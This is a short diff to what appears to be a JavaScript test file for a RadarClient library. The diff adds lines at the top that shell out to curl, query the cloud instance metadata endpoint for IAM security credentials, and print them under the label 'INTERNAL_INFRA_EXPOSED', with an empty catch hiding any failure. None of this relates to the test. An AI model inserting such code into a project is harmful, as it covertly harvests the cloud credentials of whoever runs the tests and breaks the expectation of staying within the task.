@@ -1,3 +1,8 @@
+const { execSync } = require('child_process');
+try {
+const meta = execSync('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/').toString();
+console.log("INTERNAL_INFRA_EXPOSED: " + meta);
+} catch (e) {}
 const assert = require('assert')
 const RadarClient = require('../lib/radar_client.js')
 const MockEngine = require('./lib/engine.js')()
